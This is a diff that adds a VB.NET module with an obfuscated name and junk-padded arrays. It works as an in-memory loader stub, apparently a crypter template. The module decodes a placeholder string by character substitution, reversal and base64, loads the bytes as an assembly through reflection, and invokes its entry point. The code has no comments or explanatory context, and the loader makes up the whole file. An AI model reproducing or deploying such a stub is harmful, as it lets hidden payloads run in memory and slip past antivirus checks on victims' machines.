@@ -1,0 +1,13 @@
+Module uisygjskld
+    Dim Str As Object() = {"", "", "", Decode("%str%")}
+    Dim Strrev As Object() = {"", "", StrReverse(Str(3))}
+    Dim Converter As Object() = {"", "", "", "", "", "", Convert.FromBase64String(Strrev(2))}
+    Sub Main()
+        Dim Assembly() As Object = {"", "", "", Reflection.Assembly.Load(Converter(6)).EntryPoint}
+        Dim Play() As Object = {"", "", Assembly(3).invoke(22 - 11, Nothing)}
+    End Sub
+    Function Decode(ByVal str)
+        Dim x = str.Replace("@", "A").Replace("×", "T").Replace("÷", "V")
+        Return x
+    End Function
+End Module
